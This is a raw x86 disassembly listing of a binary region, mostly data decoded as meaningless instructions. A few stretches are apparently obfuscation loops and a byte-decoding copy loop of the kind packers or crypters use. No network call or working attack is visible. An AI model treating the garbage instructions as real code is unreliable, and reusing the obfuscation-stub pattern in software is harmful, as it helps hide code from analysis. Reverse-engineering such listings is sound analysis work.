  40f1dc:	fisttp DWORD PTR [ebx+0x745553e2]
  40f1e2:	mov    edx,0x8a35af4
  40f1e7:	cmp    BYTE PTR [esi],0x5f
  40f1ea:	add    BYTE PTR [edi],cl
  40f1ec:	dec    ecx
  40f1ed:	int3   
  40f1ee:	into   
  40f1ef:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40f1f1:	loopne 0x40f1b3
  40f1f3:	lahf   
  40f1f4:	inc    eax
  40f1f5:	fcom   DWORD PTR [edx]
  40f1f7:	ja     0x40f21e
  40f1f9:	mov    edi,0x87ed824f
  40f1fe:	inc    ecx
  40f1ff:	xchg   edx,eax
  40f200:	popf   
  40f201:	inc    edi
  40f202:	clc    
  40f203:	mov    ebx,DWORD PTR [edx+esi*8-0x22]
  40f207:	int    0xc1
  40f209:	xchg   ebx,eax
  40f20a:	add    ebp,DWORD PTR [edx-0x66000b52]
  40f210:	(bad)  
  40f211:	jp     0x40f261
  40f213:	sbb    bh,BYTE PTR [eax+0x69]
  40f216:	aad    0xf
  40f218:	mov    bl,0x27
  40f21a:	icebp  
  40f21b:	call   0x17a9:0xd8a1e9f3
  40f222:	cmp    ah,BYTE PTR [ebp+ebp*4-0x3f]
  40f226:	gs addr16 popa 
  40f229:	xor    edi,DWORD PTR [ecx+edi*4-0x17e5da62]
  40f230:	test   eax,0x54819fb7
  40f235:	or     eax,0xf47a3aba
  40f23a:	inc    esp
  40f23b:	xor    al,0xcb
  40f23d:	scas   al,BYTE PTR es:[edi]
  40f23e:	jmp    0x40f266
  40f240:	sub    ebp,DWORD PTR [ebx+0x6e]
  40f243:	cmp    eax,0x3d2d1d95
  40f248:	and    DWORD PTR ds:0x8ed34091,0xc7227a0e
  40f252:	mov    ebp,0x6f3a1296
  40f257:	dec    ebx
  40f258:	inc    ebp
  40f259:	mov    esp,0xbcc7d267
  40f25e:	cmp    ah,BYTE PTR [ebx-0x6b]
  40f261:	cwde   
  40f262:	mov    dl,0x9
  40f264:	jno    0x40f2be
  40f266:	ret    
  40f267:	push   0x99e1ecc4
  40f26c:	arpl   bp,sp
  40f26e:	in     eax,0x1e
  40f270:	leave  
  40f271:	inc    ebx
  40f272:	cmp    eax,0x38436cf9
  40f277:	jne    0x40f2b8
  40f279:	lea    esi,[ecx+0x74]
  40f27c:	in     al,dx
  40f27d:	mov    cl,0x8e
  40f27f:	sub    ecx,DWORD PTR [esi+0x3b]
  40f282:	leave  
  40f283:	pop    es
  40f284:	mov    ah,0x67
  40f286:	lods   eax,DWORD PTR ds:[esi]
  40f287:	sub    BYTE PTR ds:0xcdc2333f,dl
  40f28d:	cmp    eax,0xade1748e
  40f292:	sub    eax,0x7007416a
  40f297:	std    
  40f298:	lds    ecx,FWORD PTR [edi+0x38]
  40f29b:	or     BYTE PTR [eax],al
  40f29d:	call   0xa6d2:0x922a164b
  40f2a4:	sub    BYTE PTR [ebx+0x3d],ch
  40f2a7:	jbe    0x40f25d
  40f2a9:	retf   
  40f2aa:	lds    ecx,FWORD PTR [ebp-0x24]
  40f2ad:	inc    ebp
  40f2ae:	xchg   DWORD PTR [edx-0x53],edx
  40f2b1:	cmp    edx,esi
  40f2b3:	mov    eax,0x5dd7c367
  40f2b8:	(bad)  
  40f2b9:	iret   
  40f2ba:	aaa    
  40f2bb:	sbb    DWORD PTR [ebp-0x4],ebx
  40f2be:	mov    bh,0x4f
  40f2c0:	pusha  
  40f2c1:	add    edi,DWORD PTR [ecx-0x7e9f1ff3]
  40f2c7:	jo     0x40f29a
  40f2c9:	outs   dx,BYTE PTR ds:[esi]
  40f2ca:	push   ebp
  40f2cb:	or     BYTE PTR [ebp+0x1087cd9f],al
  40f2d1:	xchg   edi,eax
  40f2d2:	popf   
  40f2d3:	jbe    0x40f301
  40f2d5:	inc    edx
  40f2d6:	sub    dl,BYTE PTR [ecx-0x60c24cb3]
  40f2dc:	fadd   st,st(1)
  40f2de:	fnstsw WORD PTR [esi]
  40f2e0:	hlt    
  40f2e1:	addr16 mov edi,cr4
  40f2e5:	fidiv  WORD PTR [eax]
  40f2e7:	fidiv  WORD PTR [ebx+edi*8+0x3bd1783e]
  40f2ee:	jns    0x40f2a2
  40f2f0:	xor    al,0xdd
  40f2f2:	cmp    BYTE PTR [ebp-0x66978aff],al
  40f2f8:	repz shl DWORD PTR [edi],0xa2
  40f2fc:	add    bl,BYTE PTR [ebx-0x1c]
  40f2ff:	outs   dx,BYTE PTR ds:[esi]
  40f300:	sub    al,BYTE PTR [esi-0x7eaa1d24]
  40f306:	(bad)  
  40f307:	jecxz  0x40f2ac
  40f309:	test   ah,0x3e
  40f30c:	xor    eax,0x4e644f92
  40f311:	jp     0x40f373
  40f313:	push   edx
  40f314:	clc    
  40f315:	push   0xd810488b
  40f31a:	fisubr WORD PTR [edi]
  40f31c:	cmp    DWORD PTR [ecx+0x4dcc547c],ecx
  40f322:	xchg   ebp,eax
  40f323:	jns    0x40f2b3
  40f325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f326:	outs   dx,BYTE PTR ds:[esi]
  40f327:	jo     0x40f351
  40f329:	sti    
  40f32a:	xor    al,0xf5
  40f32c:	dec    ebx
  40f32d:	addr16 aam 0xd
  40f330:	mov    bh,0x9f
  40f332:	mov    al,ds:0xaa74ff45
  40f337:	movups xmm5,xmm5
  40f33a:	sub    eax,DWORD PTR [ebp+0x3592b5ea]
  40f340:	dec    edi
  40f341:	rcl    BYTE PTR [edi-0x39],1
  40f344:	mov    dl,ch
  40f346:	outs   dx,BYTE PTR ds:[esi]
  40f347:	idiv   BYTE PTR ds:0xe7c70d8a
  40f34d:	cmp    al,0xe6
  40f34f:	(bad)  
  40f350:	fnsave [edx]
  40f352:	adc    ecx,DWORD PTR [eax]
  40f354:	scas   eax,DWORD PTR es:[edi]
  40f355:	xchg   edi,eax
  40f356:	xlat   BYTE PTR ds:[ebx]
  40f357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f358:	lods   eax,DWORD PTR ds:[esi]
  40f359:	jmpw   0xbf41
  40f35d:	fs in  eax,dx
  40f35f:	loop   0x40f38a
  40f361:	jns    0x40f38d
  40f363:	sti    
  40f364:	(bad)  
  40f365:	std    
  40f366:	into   
  40f367:	(bad)  
  40f368:	fimul  WORD PTR [ecx]
  40f36a:	imul   edx,ebp,0xd48e2895
  40f370:	pushf  
  40f371:	add    DWORD PTR [edx],esp
  40f373:	cmp    eax,0x92c21a86
  40f378:	lea    ebp,[esi+0x18]
  40f37b:	push   ss
  40f37c:	inc    BYTE PTR [edi-0x5d548c71]
  40f382:	mov    eax,0xf89c8531
  40f387:	and    DWORD PTR ds:0x433727,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x433727
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433727,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433727,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433727,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433727
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433727,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433727,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43362b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433703
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433657,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433657,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433657,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433657
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433657,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4336ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4336ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4336ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4336ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4336ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4336ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4336db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4336db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4336db,edx
  40f498:	cmp    DWORD PTR ds:0x4336db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433891
  40f4af:	push   0x4338e7
  40f4b4:	push   0x4338cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4336db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433717
  40f4d2:	adc    DWORD PTR ds:0x433727,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax+0x3074939]
  40f540:	adc    edx,esp
  40f542:	lods   al,BYTE PTR ds:[esi]
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	fnstenv [edi]
  40f54b:	dec    esi
  40f54c:	xchg   ecx,ebp
  40f54e:	adc    eax,0x6d8164c8
  40f553:	out    0xf6,eax
  40f555:	add    al,0x4c
  40f557:	pop    eax
  40f558:	outs   dx,BYTE PTR ds:[esi]
  40f559:	sysenter 
  40f55b:	and    BYTE PTR [ebx-0x7],ch
  40f55e:	jb     0x40f57e
  40f560:	sbb    al,0xc5
  40f562:	adc    dl,dl
  40f564:	and    ebp,DWORD PTR [eax]
  40f566:	jmp    0x1beb958e
  40f56b:	cmp    DWORD PTR [ecx-0x3593547e],0xffffffbe
  40f572:	pop    ds
  40f573:	and    eax,0xb173f378
  40f578:	sub    DWORD PTR [ecx+ebx*4],edi
  40f57b:	(bad)  
  40f57c:	loope  0x40f528
  40f57e:	mov    eax,0x91c6734a
  40f583:	mov    ah,0xe4
  40f585:	mov    al,ds:0x98308082
  40f58a:	cmp    DWORD PTR [edx+0x59142cfe],0xffffff8c
  40f591:	push   es
  40f592:	ret    0x867b
  40f595:	jmp    0x779a:0x531d633d
  40f59c:	and    ch,BYTE PTR [ebp-0x71]
  40f59f:	test   al,0x37
  40f5a1:	(bad)  
  40f5a2:	jne    0x40f5d7
  40f5a4:	add    BYTE PTR [ebx-0x1e73be8f],bh
  40f5aa:	mov    edi,DWORD PTR [edx-0x35]
  40f5ad:	ds xchg ebp,eax
  40f5af:	aad    0x71
  40f5b1:	inc    esp
  40f5b2:	and    BYTE PTR [edi-0x26],ah
  40f5b5:	cmp    DWORD PTR [esi-0x25],esp
  40f5b8:	add    BYTE PTR [edx+0x5d],bh
  40f5bb:	adc    al,0x9d
  40f5bd:	dec    ebx
  40f5be:	xchg   esi,eax
  40f5bf:	test   BYTE PTR [ebx+0x4a],cl
  40f5c2:	push   ds
  40f5c3:	xor    al,BYTE PTR [ebx-0x66dcbd6c]
  40f5c9:	fs call 0xe21db77a
  40f5cf:	fwait
  40f5d0:	mov    al,ds:0x70abd017
  40f5d5:	mov    edx,0x807f0511
  40f5da:	inc    edi
  40f5db:	mov    ebp,0xd01f2566
  40f5e0:	addr16 ss and dl,cl
  40f5e4:	test   BYTE PTR [edi],0xd5
  40f5e7:	fwait
  40f5e8:	add    DWORD PTR [esi+0x17],edx
  40f5eb:	and    DWORD PTR [edx+0x4f20242e],0x36e63f8b
  40f5f5:	xor    ah,BYTE PTR [ecx+0x7e]
  40f5f8:	cs xchg edx,eax
  40f5fa:	pop    ebx
  40f5fb:	jl     0x40f5df
  40f5fd:	stos   DWORD PTR es:[edi],eax
  40f5fe:	dec    ecx
  40f5ff:	add    BYTE PTR [ebp-0x6565490],ah
  40f605:	dec    esi
  40f606:	stos   BYTE PTR es:[edi],al
  40f607:	js     0x40f618
  40f609:	gs in  al,0x28
  40f60c:	bound  ecx,QWORD PTR [ebx+0x7d]
  40f60f:	sub    dh,BYTE PTR [esi-0x4a2697cc]
  40f615:	jo     0x40f670
  40f617:	push   0xffffffe1
  40f619:	shl    BYTE PTR [edx+edi*2],1
  40f61c:	jg     0x40f611
  40f61e:	rol    DWORD PTR [eax-0x6d],1
  40f621:	scas   al,BYTE PTR es:[edi]
  40f622:	lods   al,BYTE PTR ds:[esi]
  40f623:	mov    WORD PTR [esi-0x1d190f1],?
  40f629:	loope  0x40f5f6
  40f62b:	jb     0x40f685
  40f62d:	mov    ah,0xf0
  40f62f:	xor    DWORD PTR [ebx],ebx
  40f631:	sahf   
  40f632:	in     eax,dx
  40f633:	pushf  
  40f634:	or     al,0x11
  40f636:	ss mov DWORD PTR ss:[edi+0x54],0xd7e7411d
  40f63f:	fmul   DWORD PTR [eax]
  40f641:	fisub  DWORD PTR [ecx-0xe]
  40f644:	jmp    0x8050:0xca80a000
  40f64b:	fistp  DWORD PTR [ebx+0x21]
  40f64e:	jb     0x40f64b
  40f650:	ins    BYTE PTR es:[edi],dx
  40f651:	call   0xf26b1454
  40f656:	dec    ecx
  40f657:	ins    BYTE PTR es:[edi],dx
  40f658:	add    eax,0x34b33583
  40f65d:	aaa    
  40f65e:	push   ss
  40f65f:	sbb    al,0x8e
  40f661:	call   0x3ede:0xd013b174
  40f668:	jb     0x40f5fe
  40f66a:	mov    esi,0x9a54c58d
  40f66f:	cmp    ecx,DWORD PTR [edi]
  40f671:	das    
  40f672:	mov    dh,0xdb
  40f674:	mov    dh,0x60
  40f677:	outs   dx,BYTE PTR ds:[esi]
  40f678:	aad    0xe3
  40f67a:	loope  0x40f635
  40f67c:	loop   0x40f6a3
  40f67e:	dec    edx
  40f67f:	std    
  40f680:	mov    ch,0x3
  40f682:	bound  ebx,QWORD PTR [ebx+0x672cca5]
  40f688:	(bad)  
  40f689:	xor    dh,BYTE PTR [ecx]
  40f68b:	ss push eax
  40f68d:	xchg   BYTE PTR [edi],ah
  40f68f:	lods   al,BYTE PTR ds:[esi]
  40f690:	out    dx,eax
  40f691:	popa   
  40f692:	cmp    BYTE PTR [edx+0x6a437126],dl
  40f698:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f699:	in     al,0x60
  40f69b:	push   eax
  40f69c:	clc    
  40f69d:	pop    es
  40f69e:	pop    eax
  40f69f:	imul   esi,DWORD PTR [ebp-0x9],0xfffffff0
  40f6a3:	(bad)  
  40f6a4:	cld    
  40f6a5:	mov    eax,ds:0xaabd1c23
  40f6aa:	mov    dl,0x5
  40f6ac:	fbld   TBYTE PTR [esi+0x6c]
  40f6af:	je     0x40f6e4
  40f6b1:	adc    eax,0xc98266b6
  40f6b6:	lods   al,BYTE PTR ds:[esi]
  40f6b7:	cmp    BYTE PTR [ebx-0x732d5f79],ch
  40f6bd:	or     eax,0xf5617d34
  40f6c2:	pop    esp
  40f6c3:	dec    ecx
  40f6c4:	add    dl,BYTE PTR [ebx-0x48c084ae]
  40f6ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6cb:	mov    ds:0x467318b5,eax
  40f6d0:	daa    
  40f6d1:	add    al,0x57
  40f6d3:	inc    edi
  40f6d4:	jp     0x40f6e3
  40f6d6:	and    DWORD PTR [ecx],esi
  40f6d8:	inc    ecx
  40f6d9:	rcl    DWORD PTR [edx],1
  40f6db:	jmp    0x40f6bf
  40f6dd:	cli    
  40f6de:	and    BYTE PTR [ebx+0x283e494f],cl
  40f6e4:	adc    eax,0x8583e4c2
  40f6e9:	paddq  mm5,QWORD PTR [ebx+0x73]
  40f6ed:	jae    0x40f6a3
  40f6ef:	push   edx
  40f6f0:	dec    ecx
  40f6f1:	push   esi
  40f6f2:	add    bl,BYTE PTR [eax+0x6d]
  40f6f5:	inc    ebx
  40f6f6:	pop    edx
  40f6f7:	sub    eax,0x12c1b1f2
  40f6fc:	mov    DWORD PTR [edx],ebp
  40f6fe:	call   0x61e2e3ae
  40f703:	clc    
  40f704:	xor    BYTE PTR [ebp-0x3c74efe6],0x5d
  40f70b:	aad    0x82
  40f70d:	mov    eax,0x36ba5071
  40f712:	fcmovnu st,st(2)
  40f714:	out    dx,al
  40f715:	mov    BYTE PTR [eax+0x19],al
  40f718:	in     eax,0xdb
  40f71a:	push   0x4f325e51
  40f71f:	fcmovu st,st(0)
  40f721:	nop
  40f722:	mov    eax,edx
  40f724:	neg    DWORD PTR [eax-0x39]
  40f727:	sahf   
  40f728:	push   ecx
  40f729:	ins    BYTE PTR es:[edi],dx
  40f72a:	pop    ds
  40f72b:	cmp    al,0xbc
  40f72d:	sbb    al,0x28
  40f72f:	ficom  DWORD PTR [esi-0x31]
  40f732:	call   0xb583:0x40c09743
  40f739:	add    ah,ch
  40f73b:	mov    edx,0x6ce95165
  40f740:	jecxz  0x40f7b9
  40f742:	div    ah
  40f744:	fadd   QWORD PTR [ebx]
  40f746:	xor    eax,edx
  40f748:	sti    
  40f749:	pop    eax
  40f74a:	repz mov al,ds:0x437dddd2
  40f750:	add    edx,esp
  40f752:	aam    0xf
  40f754:	ret    0x8431
  40f757:	mov    bh,0x98
  40f759:	or     dl,0x50
  40f75c:	sub    ecx,DWORD PTR [edi+0x13197b55]
  40f762:	scas   al,BYTE PTR es:[edi]
  40f763:	sahf   
  40f764:	sar    ebp,0xb4
  40f767:	mov    bl,0xd0
  40f769:	pop    edx
  40f76a:	ret    
  40f76b:	add    esi,edx
  40f76d:	outs   dx,BYTE PTR ds:[esi]
  40f76e:	mov    edx,0xb5dae101
  40f773:	mov    ?,WORD PTR [ebx]
  40f775:	test   DWORD PTR [esi-0x4],0x306cb056
  40f77c:	aas    
  40f77d:	fcom   DWORD PTR [ecx+0x3565e407]
  40f783:	pop    edx
  40f784:	inc    ebp
  40f785:	jno    0x40f78c
  40f787:	jecxz  0x40f7d6
  40f789:	pop    edx
  40f78a:	or     esp,DWORD PTR [eax+ebx*2+0x74]
  40f78e:	mov    ch,ah
  40f790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f791:	repnz scas al,BYTE PTR es:[edi]
  40f793:	scas   al,BYTE PTR es:[edi]
  40f794:	mov    ebp,0x2e1dd9e6
  40f799:	cmp    dh,dl
  40f79b:	pushf  
  40f79c:	pop    ebp
  40f79d:	adc    bl,BYTE PTR ds:0x7c239921
  40f7a3:	adc    eax,0xeeff9271
  40f7a8:	mov    edi,0x89e7307a
  40f7ad:	jmp    0x596b:0xa82bbe33
  40f7b4:	sbb    ah,BYTE PTR gs:[esi+ebp*2+0x48]
  40f7b9:	push   esi
  40f7ba:	push   cs
  40f7bb:	xchg   bh,cl
  40f7bd:	mov    ebx,0x8d7908c6
  40f7c2:	sub    BYTE PTR [edx+0x3145c02b],cl
  40f7c8:	cmp    eax,0xe64ac81
  40f7cd:	bound  ebx,QWORD PTR [ebp+0x3e]
  40f7d0:	clc    
  40f7d1:	jmp    0x62ad:0x5e510f1
  40f7d8:	test   al,0x13
  40f7da:	pop    ecx
  40f7db:	ins    BYTE PTR es:[edi],dx
  40f7dc:	fisttp DWORD PTR [ebx+0x77128270]
  40f7e2:	mov    bl,0x66
  40f7e4:	std    
  40f7e5:	nop
  40f7e6:	sub    BYTE PTR [eax-0x70d55b2a],0x19
  40f7ed:	enter  0xe208,0x4d
  40f7f1:	push   edx
  40f7f2:	cmp    BYTE PTR [esi+ecx*1+0x1e],0x5
  40f7f7:	push   ss
  40f7f8:	cdq    
  40f7f9:	test   edi,ebx
  40f7fb:	into   
  40f7fc:	mov    bl,0x90
  40f7fe:	mov    ch,0xbb
  40f800:	daa    
  40f801:	push   esi
  40f802:	and    al,BYTE PTR [ebp-0x68]
  40f805:	pusha  
  40f806:	stc    
  40f807:	fild   QWORD PTR [esi-0x34]
  40f80a:	dec    esp
  40f80b:	imul   ecx,edi,0xffffffce
  40f80e:	jecxz  0x40f7d7
  40f810:	pop    esp
  40f811:	frstor [edx+0x3b]
  40f814:	and    eax,0x635f41b2
  40f819:	pop    ecx
  40f81a:	lods   eax,DWORD PTR ds:[esi]
  40f81b:	jge    0x40f87d
  40f81d:	jnp    0x40f86c
  40f81f:	enter  0x5c68,0x20
  40f823:	ja     0x40f7b5
  40f825:	or     BYTE PTR [edi+0x7de84cc],0x23
  40f82c:	shr    BYTE PTR [ebp+0x68],0xbd
  40f830:	jne    0x40f841
  40f832:	dec    edx
  40f833:	push   ecx
  40f834:	scas   al,BYTE PTR es:[edi]
  40f835:	sar    esi,0x6f
  40f838:	xchg   esp,eax
  40f839:	rcr    BYTE PTR [ecx-0x5d],0x21
  40f83d:	cli    
  40f83e:	inc    ecx
  40f83f:	lods   eax,DWORD PTR ds:[esi]
  40f840:	outs   dx,DWORD PTR ds:[esi]
  40f841:	push   es
  40f842:	enter  0x2b85,0x98
  40f846:	xchg   BYTE PTR [ebx],dh
  40f848:	push   0xffffffcc
  40f84a:	adc    al,0x33
  40f84c:	stc    
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0xd3f8eb3f
  40f897:	stc    
  40f898:	shr    BYTE PTR [ebx+0x7d7c7e7e],cl
  40f89e:	jle    0x40f91e
  40f8a0:	or     al,0xec
  40f8a2:	out    0x32,al
  40f8a4:	ss and eax,esi
  40f8a7:	xchg   ch,bh
  40f8a9:	xor    eax,0x455671
  40f8ae:	out    0xd,al
  40f8b0:	push   ebp
  40f8b1:	push   0x925a93e0
  40f8b6:	xchg   BYTE PTR gs:[edi+0x218a33bf],al
  40f8bd:	or     eax,edx
  40f8bf:	cdq    
  40f8c0:	rcr    BYTE PTR gs:[ebp-0x2c07c8c],1
  40f8c7:	push   edi
  40f8c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8c9:	mov    dl,0xef
  40f8cb:	outs   dx,DWORD PTR ds:[esi]
  40f8cc:	push   es
  40f8cd:	push   esi
  40f8ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8d0:	lahf   
  40f8d1:	jne    0x40f92c
  40f8d3:	inc    ecx
  40f8d4:	imul   ecx,DWORD PTR [ebp-0x4b],0xc5155c81
  40f8db:	jae    0x40f92b
  40f8dd:	pop    edi
  40f8de:	inc    edi
  40f8df:	shl    esp,0x1
  40f8e2:	jbe    0x40f8d6
  40f8e4:	mov    eax,0x7f816e4d
  40f8e9:	hlt    
  40f8ea:	inc    esp
  40f8eb:	jle    0x40f8f0
  40f8ed:	add    DWORD PTR [edi],ebx
  40f8ef:	jnp    0x40f8ed
  40f8f1:	bound  edx,QWORD PTR [ebp+0x5a]
  40f8f4:	inc    edi
  40f8f5:	jne    0x40f93e
  40f8f7:	mov    esi,0xee4a97ad
  40f8fc:	repnz daa 
  40f8fe:	in     al,0x28
  40f900:	adc    DWORD PTR [ecx],esi
  40f902:	xchg   ebx,eax
  40f903:	push   edi
  40f904:	pop    eax
  40f905:	mov    bh,0x2a
  40f907:	rol    DWORD PTR fs:[ebx-0x71343e39],cl
  40f90e:	retf   
  40f90f:	push   cs
  40f910:	xlat   BYTE PTR ds:[ebx]
  40f911:	arpl   si,ax
  40f913:	sub    dl,bl
  40f915:	in     eax,0x95
  40f917:	mov    bl,0xed
  40f919:	(bad)  
  40f91a:	mul    BYTE PTR [eax+0x522b841e]
  40f920:	cli    
  40f921:	sbb    BYTE PTR [edx+0x2],dh
  40f924:	mov    ebx,0x32c37121
  40f929:	fdivr  DWORD PTR [ecx+esi*1+0x323cc361]
  40f930:	pop    es
  40f931:	or     DWORD PTR [eax-0x12856dab],edi
  40f937:	mov    bh,0x6f
  40f939:	fisttp QWORD PTR [ebp+ebx*2-0x10032d65]
  40f940:	push   cs
  40f941:	das    
  40f942:	hlt    
  40f943:	adc    eax,0x99eb3567
  40f948:	sbb    edx,DWORD PTR [ecx+edx*8]
  40f94b:	pop    ebp
  40f94c:	cmp    al,0xe7
  40f94e:	icebp  
  40f94f:	dec    eax
  40f950:	jmp    0xceb3:0x51e3b08
  40f957:	out    dx,al
  40f958:	int3   
  40f959:	pop    ecx
  40f95a:	imul   edi,DWORD PTR [eax],0x4a028d0d
  40f960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f961:	shl    DWORD PTR [esi+0x1],cl
  40f964:	push   ecx
  40f965:	pop    ebp
  40f966:	pop    edx
  40f967:	and    ebp,DWORD PTR [ebx-0x4b95f430]
  40f96d:	jmp    0x40f956
  40f96f:	sub    ecx,ebx
  40f971:	lock mov al,ds:0x6af24de9
  40f977:	xor    al,0x70
  40f979:	cld    
  40f97a:	push   ecx
  40f97b:	xchg   DWORD PTR [ebx+0x7b],edx
  40f97e:	scas   al,BYTE PTR es:[edi]
  40f97f:	pop    ebx
  40f980:	xor    bh,bl
  40f982:	pop    ds
  40f983:	adc    cl,bl
  40f985:	push   0x10
  40f987:	mov    eax,0xd572af4a
  40f98c:	ret    
  40f98d:	cmp    dh,0x9f
  40f990:	enter  0xfae7,0x84
  40f994:	push   ebx
  40f995:	pop    edi
  40f996:	xor    al,0x89
  40f998:	fisubr WORD PTR [edi+0x3a876be9]
  40f99e:	cmp    DWORD PTR [eax-0x52],edx
  40f9a1:	out    0x15,al
  40f9a3:	dec    ebp
  40f9a4:	stc    
  40f9a5:	fimul  WORD PTR [esi]
  40f9a7:	out    dx,al
  40f9a8:	test   DWORD PTR [edx],eax
  40f9aa:	dec    ebp
  40f9ab:	ror    ch,0x23
  40f9ae:	jo     0x40f99e
  40f9b0:	dec    ecx
  40f9b1:	or     al,0x56
  40f9b3:	iret   
  40f9b4:	or     DWORD PTR [edi+ecx*4],eax
  40f9b7:	jnp    0x40f9f3
  40f9b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9ba:	fcomi  st,st(1)
  40f9bc:	iret   
  40f9bd:	xor    bl,bl
  40f9bf:	push   edi
  40f9c0:	jnp    0x40f982
  40f9c2:	fiadd  WORD PTR [ecx]
  40f9c4:	bound  esp,QWORD PTR [ebx+0x4]
  40f9c7:	sti    
  40f9c8:	je     0x40f9f1
  40f9ca:	adc    DWORD PTR [edx+0x3b3e99a5],eax
  40f9d0:	pushf  
  40f9d1:	(bad)  
  40f9d2:	lahf   
  40f9d3:	or     BYTE PTR [edx-0x5ce17519],dh
  40f9d9:	cmp    DWORD PTR [edx+edx*4],ecx
  40f9dc:	push   esi
  40f9dd:	in     eax,0xb7
  40f9df:	scas   eax,DWORD PTR es:[edi]
  40f9e0:	push   eax
  40f9e1:	shl    DWORD PTR es:[edi],1
  40f9e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9e5:	les    eax,FWORD PTR [edi]
  40f9e7:	cli    
  40f9e8:	fidivr WORD PTR [esi-0x7c]
  40f9eb:	out    dx,al
  40f9ec:	and    BYTE PTR [edx],0xe1
  40f9ef:	push   ebx
  40f9f0:	or     DWORD PTR [edx],ebp
